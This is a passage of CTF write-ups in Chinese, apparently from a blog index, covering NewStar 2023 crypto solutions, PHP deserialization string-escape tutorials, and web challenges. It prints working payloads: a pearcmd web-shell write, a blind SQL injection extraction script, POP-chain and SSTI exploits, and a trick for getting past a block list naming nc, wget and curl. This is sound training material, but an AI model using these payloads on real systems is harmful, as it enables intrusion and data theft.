import *\ndef lift_point(E, P):\n    R = P.base_ring()\n    x, y = map(ZZ, P.xy())\n    PP = E.lift_x(x, all=True)\n    for pt in PP:\n        _, yy = map(R, pt.xy())\n        if y == yy:\n            return pt\np = 75206427479775622966537995406541077245842499523456803092204668034148875719001\na = 40399280641537685263236367744605671534251002649301968428998107181223348036480\nb = 34830673418515139976377184302022321848201537906033092355749226925568830384464\nE = EllipticCurve(GF(p), [a, b])\nG = E(63199291976729017585116731422181573663076311513240158412108878460234764025898, 11977959928854309700611217102917186587242105343137383979364679606977824228558)\nP = E(75017275378438543246214954287362349176908042127439117734318700769768512624429, 39521483276009738115474714281626894361123804837783117725653243818498259351984)\nEE = E = EllipticCurve(Qp(p), [int(a) + p * ZZ.random_element(1, p) for a in E.a_invariants()])\nx, y = map(ZZ, P.xy())\nGG = lift_point(EE, G)\nPP = lift_point(EE, P)\nGp = p * GG\nPp = p * PP\nGx, Gy = Gp.xy()\nPx, Py = Pp.xy()\nd = ZZ((Px / Py) / (Gx / Gy)) % p\n\n# d = 706900059475062772067312229965334421909675651947459433421022963709731965\nprint(long_to_bytes(d))\n```\n\n#### error[官方解]\n\n- **考点 lwe**\n\n- **FLAG**：flag{try_lear1n_wi0h_t1e_error}\n\n- **解题步骤**\n\n```python\n\"\"\"\n考点 lwe\nFLAG：flag{try_lear1n_wi0h_t1e_error}\n解题步骤\n\"\"\"\nimport re\ns2n=lambda x: [int(x) for x in re.findall(r\"\\-?\\d+\\.?\\d*\",x)]\nf=open(\"./enc.out\",\"r\").readlines()\nm = 66\nn = 200\np = 5\nq = 2^20\nB = [s2n(f[i]) for i in range(m)]\nA = [s2n(f[i+66]) for i in range(m)]\nC = [s2n(f[i+132]) for i in range(m)]\n# print(A)\n# print(B)\n# print(C)\n\nb= list(matrix(ZZ,s2n(f[-1])))\nm=A+B+C+b\nM = matrix(ZZ,m)\nL = M.LLL()\nprint(L[0])\nres=M.solve_left(L[0])\nfor i in res[:-1]:\n    print(chr(abs(i)),end=\"\")\n\n```\n\n> 官方WriteUp：https://shimo.im/docs/gXqmdVvbOEsXpo3o/\n","tags":["ctf","crypto","web"],"categories":["CTF","NewStar 2023"]},{"title":"PHP序列化字符逃逸","url":"/PHP序列化字符逃逸/","content":"\n## 反序列化字符逃逸\n\n此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞\n这种题目有个共同点：\n\n\n\n1. php序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。\n2. 总是先进行序列化，再进行替换修改操作。\n\n\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\n// echo serialize($AA).\"\\n\";$res=filter(serialize($AA));\n\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\n以上面代码为例，如何在不直接修改`$pass`值的情况下间接修改`$pass`的值。\n这段代码的流程是，先序列化代码，然后将里面不希望出现的字符bb替换成自定义的字符串ccc。然后进行[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)，最后输出pass变量。\n\n要解决上面这个问题，先来看一下php序列化代码的特征。\n\n\n\n**O:1:\"A\":2:{s:4:\"name\";s:4:\"aaaa\";s:4:\"pass\";s:6:\"123456\";}**\n\n我们可以看到，反序列化字符串都是以`\";}`结束的，所以如果我们把`\";}`带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。\n**在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度s错误则反序列化就会失败。**\n\n根据刚才讲的，如果我们将name变量中添加bb则程序就会报错，因为bb将被filter函数替换成ccc，ccc的长度比bb多1，这样前面的s所代表的长度为2但是内容却变长了，成了ccc。\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaabb';\n    public $pass='123456';\n}\n$AA=new A();\n// echo serialize($AA).\"\\n\";$res=filter(serialize($AA));\necho serialize($AA).\"\\n\";\n$res = filter(serialize($AA));\necho $res;\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\n\n\n**O:1:\"A\":2:{s:4:\"name\";s:6:\"aaaabb\";s:4:\"pass\";s:6:\"123456\";}**\n\n**O:1:\"A\":2:{s:4:\"name\";s:6:\"aaaaccc\";s:4:\"pass\";s:6:\"123456\";}**\n\n可见在序列化后的字符串在经过filter函数过滤前，s为6，内容为aaaabb；经过filter过滤后，s仍然为6，但内容变为了aaaaccc，长度变成了7，根据反序列化读取变量的原则来讲，此时的name能读取到的只是aaaacc，末尾处的那个c是读取不到的，这就形成了一个字符串的逃逸。当我们添加多个bb，每添加一个bb我们就能逃逸一个字符，那我们将逃逸的字符串的长度填充成我们要反序列化的代码长度的话那就可以控制反序列化的结果以及类里面的变量值了。\n\n\n\n假如在name处改为：`\";s:4:\"pass\";s:6:\"hacker\";}`\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='\";s:4:\"pass\";s:6:\"hacker\";}';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res = filter(serialize($AA));\necho $res;\n$c=unserialize($res);\necho $c->pass;\n?>\n```\n\n由于`$name`被序列化后的长度是固定的，在反序列化后`$name`仍然为`\";s:4:\"pass\";s:6:\"hacker\";}`，`$pass`仍然为`123456`：\n\n**O:1:\"A\":2:{s:4:\"name\";`s:27:\"\";s:4:\"pass\";s:6:\"hacker\";}\"`;s:4:\"pass\";s:6:\"123456\";}**\n\n关键点在于filter函数，这个函数检测并替换了非法字符串，看似增加了代码的安全系数，实则让整段代码更加危险。filter函数中检测序列化后的字符串，如果检测到了非法字符'bb'，就把它替换为'ccc'。\n此时我们发现\";s:4:\"pass\";s:6:\"hacker\";}的长度为27，如果我们再加上27个bb，那最终的长度将增加27，不就能逃逸后面的\";s:4:\"pass\";s:6:\"hacker\";}了吗？如下：\n\n```php\n<?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:6:\"hacker\";}';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res = filter(serialize($AA));\necho $res.\"\\n\";\n$c=unserialize($res);\nprint_r($c).\"\\n\";\necho $c->pass;\n?>\n```\n\n运行结果：\n\n```php\nO:1:\"A\":2:{s:4:\"name\";s:81:\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:6:\"hacker\";}\";s:4:\"pass\";s:6:\"123456\";}\nO:1:\"A\":2:{s:4:\"name\";s:81:\"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\";s:4:\"pass\";s:6:\"hacker\";}\";s:4:\"pass\";s:6:\"123456\";}\nA Object\n(\n    [name] => ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\n    [pass] => hacker\n)\nhacker\n```\n\n此时，成功逃逸，修改了pass的值\n\n填充的27个bb，在经过filter函数过滤后会增加27个字符的长度，这27个字符会填充当前payload字符串的长度，而payload则顺利的逃逸处了php反序列化中s的检查\n\n被逃逸出的payload会被当成当前类的属性继续执行`\";s:4:\"pass\";s:6:\"hacker\";}`，而后一部分由于前面的payload已经构成了闭合，所以不在执行\n\n#### [NewStar2023 week4]逃\n\n题目：\n\n```php\n <?php\nhighlight_file(__FILE__);\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key;\n    public $cmd = \"whoami\";\n    public function __construct($key)\n    {\n        $this->key = $key;\n    }\n    public function __destruct()\n    {\n        system($this->cmd);\n    }\n}\n\nunserialize(waf(serialize(new GetFlag($_GET['key'])))); www-data www-data \n```\n\n**经典的php反序列化字符逃逸**\n\n首先构造序列化代码：\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='bad';   \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n```\n\n`O:7:\"GetFlag\":2:{s:3:\"key\";s:3:\"bad\";s:3:\"cmd\";s:4:\"ls /\";}`\n\n我们需要逃逸的是`\";s:3:\"cmd\";s:4:\"ls /\";}`\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='\";s:3:\"cmd\";s:4:\"ls /\";}';  \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n```\n\n\n\n`O:7:\"GetFlag\":2:{s:3:\"key\";s:24:\"\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}`\n\n总共24个字符，于是我们写24个bad就行\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\n\nclass GetFlag {\n    public $key='badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}';  \n    public $cmd = \"ls /\";\n}\n\n$a = new GetFlag();\necho serialize($a).\"\\n\";\n\n$res = waf(serialize($a));\necho $res.\"\\n\";\n\n$c = unserialize($res);\nprint_r($c).\"\\n\";\necho $c->cmd;\n```\n\n运行结果：\n\n```php\nO:7:\"GetFlag\":2:{s:3:\"key\";s:96:\"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}\nO:7:\"GetFlag\":2:{s:3:\"key\";s:96:\"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\";s:3:\"cmd\";s:4:\"ls /\";}\";s:3:\"cmd\";s:4:\"ls /\";}\nGetFlag Object\n(\n    [key] => goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\n    [cmd] => ls /\n)\nls /\n```\n\npayload：\n\n`key = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:4:\"ls /\";}\" `\n\n![image-20231030150507471](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231030150507471.png)\n\n接着构造payload查看flag\n\n`/?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:9:\"cat /flag\";}`\n\n![image-20231030150810755](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231030150810755.png)\n\n\n\n","tags":["PHP","序列化","反序列化","字符逃逸"],"categories":["PHP"]},{"title":"PHP序列化基础知识","url":"/PHP序列化基础知识/","content":"\n## 序列化和反序列化的概念\n\n序列化就是将对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名。\n 反序列化则相反将字符串重新恢复成对象。\n 对象的序列化利于对象的保存和传输,也可以让多个文件共享对象。\n\n## 序列化中常见的魔法函数：\n\n```scss\n__construct() 创建对象时调用\n__destruct() 销毁对象时调用\n__toString() 当一个对象被当作一个字符串使用\n__sleep() 在对象在被序列化之前运行\n__wakeup 将在序列化之后立即被调用\n```\n\n![image-20231024142146721](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024142146721.png)\n\n#### 看一串字符串\n\n```php\nO:3:\"Ctf\":3{s:4:\"flag\";s:13:\"flag{abedyui}\";s:4:\"name\";s:7:\"Sch0lar\";s:3:\"age\";s:2:\"18\";}\n\nO代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示\n3 代表类名字占三个字符 \nctf 类名\n3 代表三个属性\ns代表字符串\n4代表属性名长度\nflag属性名\ns:13:\"flag{abedyui}\" 字符串 属性值长度 属性值\n```\n\n#### 访问控制修饰符\n\n根据访问控制修饰符的不同 序列化后的 属性长度和属性值会有所不同,所以这里简单提一下\n\n```scss\npublic(公有)\nprotected(受保护)\nprivate(私有的)\nprotected属性被序列化的时候属性值会变成：%00*%00属性名\nprivate属性被序列化的时候属性值会变成：%00类名%00属性名\n```\n\n就像这样\n\n```php\nO:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}//这里是private属性被序列化\n```\n\n#### 绕过__wakeup()函数\n\n当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。\n\n```php\n//将上面的对象属性个数值改成逼真实个数打\nO:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\n##### [极客大挑战 2019]PHP\n\n```php\n<?php\ninclude 'flag.php';\n\nerror_reporting(0);\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n\n            \n        }\n    }\n}\n?>\n```\n\n得到\n\n```php\nO:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\n```\n\n绕过__wakeup\n\n```php\nO:4:\"Name\":3:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\n```\n\nprivate属性被序列化的时候属性值会变成%00类名%00属性名,根据规则进行修改\n\n```php\nO:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\n然后?select传值\n\n```php\n?select=O:4:\"Name\":3{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\n`https://blog.csdn.net/weixin_45785288/article/details/109877324`\n","tags":["序列化","反序列化","php"],"categories":["PHP"]},{"title":"NewStar2023 Week3","url":"/NewStar2023-WriteUp-Week3/","content":"\n## week3\n\n### web\n\n#### Include 🍐\n\n题目：\n\n```php\n <?php\n    error_reporting(0);\n    if(isset($_GET['file'])) {\n        $file = $_GET['file'];\n        \n        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {\n            die('hacker!');\n        }\n        \n        include($file.\".php\");\n        # Something in phpinfo.php!\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n?> \n```\n\n根据提示打开`phpinfo.php` => `?file=phpinfo`, 搜索flag\n\n![image-20231024100040895](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100040895.png)\n\n根据提示搜索`register_argc_argv`, 发现为On\n\n![image-20231024100618137](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100618137.png)\n\n结合题目提示🍐，应该是利用pearcmd文件包含\n\n构造**payload**\n\n`?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST[0]);?>+/tmp/cmd.php`\n\n![image-20231024102307424](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102307424.png)\n\n进行`POST`查看flag\n\n```php\n?file=/tmp/cmd\n#POST\n0 = system(\"cat /flag\");\n```\n\n![image-20231024102854987](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102854987.png)\n\n参考文章：https://blog.csdn.net/RABCDXB/article/details/122050370\n\n#### medium_sql\n\n测试判断是否存在布尔盲注 **# 要编码为%23**\n\n```sql\n?id=TMP0919'And if(1>0,1,0)%23\n?id=TMP0919'And if(0>1,1,0)%23\n```\n\n前者可以返回正常的信息`id: TMP0919`，后者会返回`id not exists`  \n\n注意用大小写绕过被过滤的字符\n\n```python\nimport time\nimport requests\n\n\ndef db_length(str, url):\n    print(\"[-] 测试数据库长度.......\")\n    num = 1\n    while True:\n        payload = url + f\"'%20And%20lengTh(daTabase())={num}%23\"\n        # print(payload)\n        r = requests.get(url=payload)\n        time.sleep(0.1)\n        # print(r.text)\n        if str in r.text:\n            db_length = num\n            print(f\"[+] 数据库长度：{db_length}\")\n            db_name(db_length)\n            break\n        else:\n            num += 1\n\n\ndef db_name(db_length):\n    print(\"[-] 测试数据库名.......\")\n    strascii = \"qwertyuioplkjhgfdsazxcvbnm1234567890\"\n    tmp = \"\"\n    for i in range(1, db_length + 1):\n        for j in strascii:\n            payload = url + f\"'%20And%20Substr(dAtabase(),{i},1)='{j}'%23\"\n            # print(payload)\n            time.sleep(0.1)\n            r = requests.get(url=payload)\n            if str in r.text:\n                tmp += j\n                print(tmp)\n    print(f\"[+] 数据库名：{tmp}\")\n    table_name()\n\n\ndef table_name():\n    print(\"[-] 测试数据库 表名.......\")\n    strascii = \"abcdefghijklmnopqrstuvwxyz1234567890_, \"\n    tmp = \"\"\n    for i in range(25):  # 假定表的长度为25\n        for j in strascii:\n            payload = url + f\"'%20And%20Substr((Select%20Group_Concat(table_name)%20fRom%20infoRmation_schema.tables%20wHere%20tAble_schema=dAtabase()),{i},1)='{j}'%23\"\n            time.sleep(0.1)\n            r = requests.get(url=payload)\n            if str in r.text:\n                tmp += j\n                # print(tmp)\n    print(f\"[+] 数据库 表名：{tmp}\")\n    table_columns()\n\n\ndef table_columns():  # 此函数是在测试处数据库表名后才写出，因而知道表名“grades,here_is_flag”\n    print(\"[-] 测试数据库表中列名信息.......\")\n    strascii = \"abcdefghijklmnopqrstuvwxyz1234567890_, \"\n    tmp = \"\"\n    for i in range(10):  # 假定列名长度为10\n        for j in strascii:\n            payload = url + f\"'%20And%20Substr((Select%20Group_Concat(column_name)%20fRom%20infoRmation_schema.columns%20wHere%20tAble_name='here_is_flag'),{i},1)='{j}'%23\"\n            time.sleep(0.1)\n            r = requests.get(url=payload)\n            if str in r.text:\n                tmp += j\n                print(tmp)\n    print(f\"[+] 数据库表中列名信息：{tmp}\")\n    information_flag()\n\n\ndef information_flag():\n    print(\"[-] 测试数据库表中数据.......\")\n    strascii = \"abcdefghijklmnopqrstuvwxyz1234567890_, {}\"\n    tmp = \"\"\n    for i in range(50):  \n        for j in strascii:\n            payload = url + f\"'%20And%20Substr((Select%20flag%20fRom%20here_is_flag),{i},1)='{j}'%23\"\n            time.sleep(0.1)\n            r = requests.get(url=payload)\n            if str in r.text:\n                tmp += j\n                # print(tmp)\n    print(f\"[+] 数据库表中数据：{tmp}\")\n\n\nif __name__ == '__main__':\n    url = 'http://efffc673-9bf2-42fc-ac02-9a443cbe5a85.node4.buuoj.cn:81/?id=TMP0919'\n    str = 'Physics'\n    db_length(str, url)\n\n```\n\n注意：上述脚本没有使用算法，直接遍历获得相关信息，因而运行时间较长，各位可以根据需求修改代码\n\n![image-20231027122055140](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027122055140.png)\n\n#### POP Gadget\n\n题目：\n\n```php\n <?php\nhighlight_file(__FILE__);\n\nclass Begin{\n    public $name;\n\n    public function __destruct()\n    {\n        if(preg_match(\"/[a-zA-Z0-9]/\",$this->name)){\n            echo \"Hello\";\n        }else{\n            echo \"Welcome to NewStarCTF 2023!\";\n        }\n    }\n}\n\nclass Then{\n    private $func;\n\n    public function __toString()\n    {\n        ($this->func)();\n        return \"Good Job!\";\n    }\n\n}\n\nclass Handle{\n    protected $obj;\n\n    public function __call($func, $vars)\n    {\n        $this->obj->end();\n    }\n\n}\n\nclass Super{\n    protected $obj;\n    public function __invoke()\n    {\n        $this->obj->getStr();\n    }\n\n    public function end()\n    {\n        die(\"==GAME OVER==\");\n    }\n}\n\nclass CTF{\n    public $handle;\n\n    public function end()\n    {\n        unset($this->handle->log);\n    }\n\n}\n\nclass WhiteGod{\n    public $func;\n    public $var;\n\n    public function __unset($var)\n    {\n        ($this->func)($this->var);    \n    }\n}\n\n@unserialize($_POST['pop']); \n```\n\n>//目的是触发readfile(\"/flag\")函数\n>\n>//需要触发WihteGod->__unset()方法 就必须通过unset(WihteGod()) \n>\n>//需要unset(WihteGod()) 就必须通过CTF->end()\n>\n>//需要CTF->end() 就必须通过Handle->__call()\n>\n>//需要Handle->__call() 就必须通过Handle->[不存在的函数]() 也就是Handle->getStr()   **—call是魔术方法的一个，当程序调用到当前类中未声明或没权限调用的方法时，就会调用—call方法**\n>\n>//需要Handle->getStr() 就必须通过Super->__invoke() \n>\n>//需要Super->__invoke() 就必须通过(Super)()被当做函数调用**—invoke()：当尝试以调用函数的方式调用一个对象时，—invoke() 方法会被自动调用。**\n>\n>//需要(Super)() 就必须通过Then->__toString()\n>\n>//需要Then->__toString() 就必须Then被当做字符串\n>\n>//需要Then被当做字符串 就必须通过Begin->__destruct()\n\n由题目得知，我们最终是要想办法触发`WhiteGod->__unset()方法`，这样就能够通过构造**WhiteGod(func,cmd)**类，传入需要执行的函数和命令（例如`system(\"ls\")`）。\n\n要触发`WhiteGod->__unset()方法`，就必须有一个`unset(WhiteGod->不存在)`，也就是**CTF(WhiteGod(func,cmd))**，并且要想办法触发`CTF->end()`。\n\n要触发`CTF->end()`方法，就只能通过`Handle(CTF)`，也就是**Handle(CTF(WhiteGod(func,cmd)))**。并且要想办法触发`Handle->__call()`。\n\n要触发`Handle->__call()`方法，就需要出现`Handle->不存在`，即`Handle->不存在getStr()`，也就是**Super(Handle(CTF(WhiteGod(func,cmd))))**，并且要想办法触发`Super->__invoke()`。\n\n要触发`Super->__invoke()方法`，就需要出现`(Super)();`即Super被当做函数名调用，也就是**Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**，并且要想办法触发`Then->__toString()方法`。\n\n要触发`Then->__toString()方法`，就需要`Then被当做字符串处理`，即`Begin()->__destruct()`中的正则。也就是**Begin(Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**\n\n这样，完整的POP链就构造出来了\n\n****\n\n**编写Exp**\n\n```php\n<?php\n\nuse Begin as GlobalBegin;\nuse Then as GlobalThen;\n\nclass Begin{\n    public $name;\n\n    public function __construct($a)\n    {\n        $this->name = $a;\n    }\n\n}\n\nclass Then{\n    private $func;\n\n    public function __construct($a)\n    {\n        $this->func = $a;\n    }\n\n}\n\nclass Handle{\n    protected $obj;\n\n    public function __construct($a)\n    {\n        $this->obj = $a;\n    }\n\n}\n\nclass Super{\n    protected $obj;\n    public function __construct($a)\n    {\n        $this->obj = $a;\n    }\n\n}\n\nclass CTF{\n    public $handle;\n\n    public function __construct($a)\n    {\n        $this->handle = $a;\n    }\n\n}\n\nclass WhiteGod{\n    public $func;\n    public $var;\n\n    public function __construct($a, $b)\n    {\n        $this->func = $a;\n        $this->var = $b;\n    }\n}\n\n$obj = new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod(\"readfile\",\"/flag\"))))) );\necho urlencode(serialize($obj));\n\n?>\n```\n\n![image-20231025201417567](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025201417567.png)\n\n\n\n#### R!!!C!!!E!!!\n\n题目：\n\n```php\n <?php\nhighlight_file(__FILE__);\nclass minipop{\n    public $code;\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\nif(isset($_POST['payload'])){\n    //wanna try?\n    unserialize($_POST['payload']);\n} \n```\n\n观察源码，典型的php序列化，观察题目，这又是一道rce的题目，应该可以通过tee命令->**把执行的命令写入文件，我们可以访问这个文件来看到回显内容**\n\n```php\n<?php\nclass minipop{\n    public $code=\"ls / | t''ee a\";\n    public $qwejaskdjnlka;\n}\n$a = new minipop();\n$b = new minipop();\n$b->qwejaskdjnlka = $a;\necho urlencode(serialize($b));\n\n?>\n```\n\n`O%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BN%3B%7D%7D`注意将+ 换成%20\n\n接着访问`url/a`\n\n![image-20231027144154458](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144154458.png)\n\n发现flag的藏身之地\n\n```php\n<?php\nclass minipop{\n    public $code=\"cat /flag_is_h3eeere | t''ee b\";\n    public $qwejaskdjnlka;\n}\n$a = new minipop();\n$b = new minipop();\n$b->qwejaskdjnlka = $a;\necho urlencode(serialize($b));\n\n?>\n```\n\n访问url/b 出现flag\n\n![image-20231027144414800](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144414800.png)\n\n\n\n#### GenShin\n\n抓包发现：/secr3tofpop\n\n![image-20231027145206974](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145206974.png)\n\n打开发现 需要通过get给name传参\n\n![image-20231027145301252](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145301252.png)\n\n发现给name传什么，页面就回显什么，首先尝试了php伪协议读取文件，测试失败，在查询资料后发现与`UNCTF2020`的easyflask题目很相似，猜测是模版注入，首先尝试{% raw %}{{%print(7*7)%}}{% endraw %}\n\n发现应该是 {% raw %}{{{% endraw %}被过滤,于是我们尝试{% raw %}{%print(7*7)%}->{%%}{% endraw %}里面可以执行python命令\n\n![image-20231027145716110](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145716110.png)\n\n出现了计算的结果，于是打开config配置->{% raw %}**{%print(config)%}** {% endraw %}没有发现有用信息\n\n![image-20231027150211931](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027150211931.png)\n\n接着猜测是jinja2模板注入，所以是__ class __ 找父类，然后 __  base __ 继续梭，然后__ subclasses __拿到所有类\n\n![image-20231027151116330](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027151116330.png)\n\n接着写脚本找出能用的os类，在此基础上进行RCE：\n\n```python\nimport requests\nimport re\nimport time\nfor i in range(0,600):\n    url = \"http://ea05b4b0-6969-4766-a5cd-d6766af72b08.node4.buuoj.cn:81/secr3tofpop\"\n    payload = '{% print([].__class__.__base__.__subclasses__()[' + str(i) + ']) %}' #注意引号\n    # print(payload)\n    get_data = {\"name\": payload}\n    s = requests.get(url=url,params=get_data)\n    time.sleep(0.1)\n    if 'os' in s.text:\n        print(i)\n        print(s.text)\n\n```\n\n接着用init方法\n\n```bash\n __init__:所有自带类都包含init方法。是服务下面这个函数的\n  __globals__:\nfunction.__globals__，用于获取function所处空间下可使用的module、方法以及所有变量。\n```\n\n发现被过滤，但是可以字符串拼接\n\n```python\n{%print([].__class__.__base__.__subclasses__()[95][\"__in\"+\"it__\"].__globals__[\"os\"].listdir(\".\"))%}\t\t# 不能成功显示\n{%print([].__class__.__base__.__subclasses__()[96][\"__in\"+\"it__\"].__globals__[\"os\"].listdir(\".\"))%}\t\t# 不能成功显示\n{%print([].__class__.__base__.__subclasses__()[132][\"__in\"+\"it__\"].__globals__[\"os\"].listdir(\".\"))%}\t # 不能成功显示\n{%print([].__class__.__base__.__subclasses__()[309][\"__in\"+\"it__\"].__globals__[\"os\"].listdir(\".\"))%}     # 能成功显示\n```\n\n![image-20231027153849947](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027153849947.png)\n\n利用 _ _ builtins _ _ 读文件\n\n![image-20231027154020545](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027154020545.png)\n\n> 模版注入相关知识点可以参考这篇文章 写的很不错： https://blog.csdn.net/LYJ20010728/article/details/120205725?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165811033516781647533366%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165811033516781647533366&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-120205725-null-null.142%5Ev32%5Enew_blog_pos_by_title,185%5Ev2%5Econtrol&utm_term=SSTI%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187\n\n### crypto\n\n#### Rabin's RSA\n\n题目：\n\n```python\nfrom Crypto.Util.number import *\nfrom secret import flag\np = getPrime(64)\nq = getPrime(64)\nassert p % 4 == 3\nassert q % 4 == 3\n\nn = p * q\n\ne = 2\nm = bytes_to_long(flag)\n\nc = pow(m,e,n)\n\nprint('n =', n)\nprint('c =', c)\n\n# n = 201354090531918389422241515534761536573\n# c = 20442989381348880630046435751193745753\n```\n\n根据提示，需要用到RSA-rabin算法\n\n首先进行大素数分解\n\n![image-20231025200757749](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025200757749.png)\n\npython脚本\n\n```python\nimport gmpy2\nimport libnum\n\np = 13934102561950901579\nq = 14450452739004884887\nn = 201354090531918389422241515534761536573\nc = 